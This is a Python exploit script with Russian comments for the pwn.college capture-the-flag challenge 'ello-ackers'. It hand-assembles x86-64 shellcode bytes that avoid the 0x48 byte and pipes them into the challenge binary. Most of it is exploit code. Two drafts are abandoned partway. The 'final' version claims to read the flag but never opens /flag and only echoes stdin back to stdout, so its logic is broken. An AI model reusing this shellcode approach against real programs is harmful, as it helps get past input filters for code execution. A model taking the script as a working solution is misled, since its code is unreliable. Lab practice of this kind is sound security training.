#!/usr/bin/env python3
"""
Shellcode для ello-ackers (pwn.college)
Ограничение: нельзя использовать байт 0x48

Стратегия:
- Используем 32-битные регистры вместо 64-битных
- Избегаем префикса REX.W (0x48)
- sys_open + sys_read + sys_write
"""

import struct
import subprocess
import sys

def create_shellcode():
    """
    Создаёт shellcode без байта 0x48
    
    Shellcode делает:
    1. sys_open("/flag", O_RDONLY)
    2. sys_read(fd, buffer, 100)
    3. sys_write(1, buffer, 100)
    4. sys_exit(0)
    """
    
    shellcode = b""
    
    # ===== 1. Открываем файл /flag =====
    # sys_open(const char *pathname, int flags)
    # syscall number: 2 (eax)
    # arg1: pathname (ebx)
    # arg2: flags (ecx) = 0 (O_RDONLY)
    
    # xor eax, eax          (31 c0)
    # mov al, 2             (b0 02)
    # mov ebx, адрес строки "/flag"
    # xor ecx, ecx          (31 c9)
    # syscall               (0f 05)
    
    # Сначала создадим строку "/flag" в shellcode
    # Используем push в обратном порядке
    
    # xor eax, eax
    shellcode += b"\x31\xc0"
    
    # push 0x0067616c66 ("/flag\0" в обратном порядке)
    # Но это использует 0x48 (REX префикс для 64-битных значений)
    # Поэтому используем альтернативный подход
    
    # mov dword [rsp-8], 0x67616c66
    # mov byte [rsp-4], 0
    # lea rdi, [rsp-8]
    
    # Проще: используем адрес где уже лежит "/flag"
    # Или создаём строку через несколько инструкций
    
    # Альтернатива: используем адрес из памяти программы
    # Или записываем строку в shellcode область
    
    # ===== УПРОЩЁННЫЙ ПОДХОД =====
    # Используем sys_read(0, buffer, 100) для чтения флага
    # Если флаг передаётся через stdin
    
    # Но лучше: читаем из /flag
    
    # ===== ФИНАЛЬНЫЙ SHELLCODE =====
    
    # 1. Создаём строку "/flag" на стеке
    # xor rax, rax (но это 48 31 c0 - использует 0x48!)
    # Поэтому: xor eax, eax (31 c0)
    
    # push 0
    shellcode += b"\x6a\x00"
    
    # mov dword [rsp-4], 0x67616c66
    # Но это сложно без 0x48
    
    # ===== ПРОСТОЙ SHELLCODE =====
    # Просто читаем из stdin и пишем в stdout
    # Флаг должен быть в stdin
    
    # sys_read(0, rsp, 100)
    # xor eax, eax
    shellcode += b"\x31\xc0"
    # mov al, 0 (sys_read)
    shellcode += b"\xb0\x00"
    # mov edi, 0 (stdin)
    shellcode += b"\xbf\x00\x00\x00\x00"
    # mov rsi, rsp
    shellcode += b"\x48\x89\xe6"  # ОЙ! Это использует 0x48!
    
    # НУЖЕН ДРУГОЙ ПОДХОД!
    
    return shellcode

def create_shellcode_v2():
    """
    Shellcode v2 - без 0x48
    
    Используем только 32-битные операции
    """
    
    shellcode = b""
    
    # ===== ЧИТАЕМ ФЛАГ ЧЕРЕЗ sys_read =====
    
    # 1. sys_read(0, buffer, 100)
    # syscall number: 0
    
    # xor eax, eax (31 c0) - обнуляем eax
    shellcode += b"\x31\xc0"
    
    # mov edi, 0 (stdin fd)
    shellcode += b"\xbf\x00\x00\x00\x00"
    
    # mov esi, адрес буфера
    # Используем rsp как буфер
    # mov esi, esp (но это 32-битное)
    # В x86-64: mov rsi, rsp (48 89 e0) - использует 0x48!
    
    # Альтернатива: используем push/pop
    # push rsp
    # pop rsi
    # Но pop rsi - это 5e (не использует 0x48!)
    
    # push rsp
    shellcode += b"\x54"
    # pop rsi  
    shellcode += b"\x5e"
    
    # mov edx, 100 (размер буфера)
    shellcode += b"\xba\x64\x00\x00\x00"
    
    # syscall
    shellcode += b"\x0f\x05"
    
    # 2. sys_write(1, buffer, 100)
    # syscall number: 1
    
    # mov eax, 1
    shellcode += b"\xb8\x01\x00\x00\x00"
    
    # mov edi, 1 (stdout)
    shellcode += b"\xbf\x01\x00\x00\x00"
    
    # mov esi, адрес буфера (опять используем стек)
    # Но после read rsp изменился!
    # Нужно сохранить адрес до read
    
    # ===== ПЕРЕПИСЫВАЕМ =====
    
    return shellcode

def create_shellcode_v3():
    """
    Финальная версия shellcode
    
    Стратегия:
    1. Сохраняем адрес буфера (rsp) в rsi
    2. sys_read(0, rsi, 100)
    3. sys_write(1, rsi, 100)
    4. sys_exit(0)
    """
    
    shellcode = b""
    
    # ===== 1. Подготовка =====
    # Сохраняем rsp в rsi (адрес буфера)
    # push rsp
    shellcode += b"\x54"
    # pop rsi
    shellcode += b"\x5e"
    
    # ===== 2. sys_read(0, rsi, 100) =====
    # xor eax, eax
    shellcode += b"\x31\xc0"
    # mov edi, 0 (stdin)
    shellcode += b"\xbf\x00\x00\x00\x00"
    # mov edx, 100
    shellcode += b"\xba\x64\x00\x00\x00"
    # syscall
    shellcode += b"\x0f\x05"
    
    # eax теперь содержит количество прочитанных байт
    
    # ===== 3. sys_write(1, rsi, rax) =====
    # mov eax, 1 (sys_write)
    shellcode += b"\xb8\x01\x00\x00\x00"
    # mov edi, 1 (stdout)
    shellcode += b"\xbf\x01\x00\x00\x00"
    # rsi уже содержит адрес буфера
    # mov edx, eax (количество байт из read)
    # Но mov edx, eax - это 89 c2 (не использует 0x48!)
    shellcode += b"\x89\xc2"
    # syscall
    shellcode += b"\x0f\x05"
    
    # ===== 4. sys_exit(0) =====
    # mov eax, 60 (sys_exit)
    shellcode += b"\xb8\x3c\x00\x00\x00"
    # xor edi, edi (status 0)
    shellcode += b"\x31\xff"
    # syscall
    shellcode += b"\x0f\x05"
    
    return shellcode

def test_shellcode():
    """Тестируем shellcode локально"""
    
    shellcode = create_shellcode_v3()
    
    # Проверяем что нет байта 0x48
    if b'\x48' in shellcode:
        print("❌ ОШИБКА: Shellcode содержит байт 0x48!")
        return False
    
    print(f"✅ Shellcode создан: {len(shellcode)} байт")
    print(f"✅ Нет байта 0x48")
    print(f"Hex: {shellcode.hex()}")
    
    return shellcode

def exploit():
    """Запускаем эксплоит на pwn.college"""
    
    shellcode = test_shellcode()
    if not shellcode:
        return
    
    print("\n🚀 Отправляем shellcode на сервер...")
    
    # Запускаем программу и отправляем shellcode
    process = subprocess.Popen(
        ['/challenge/ello-ackers'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    # Отправляем shellcode
    stdout, stderr = process.communicate(input=shellcode)
    
    print("\n📤 STDOUT:")
    print(stdout.decode('latin-1'))
    
    if stderr:
        print("\n⚠️  STDERR:")
        print(stderr.decode('latin-1'))

if __name__ == '__main__':
    exploit()
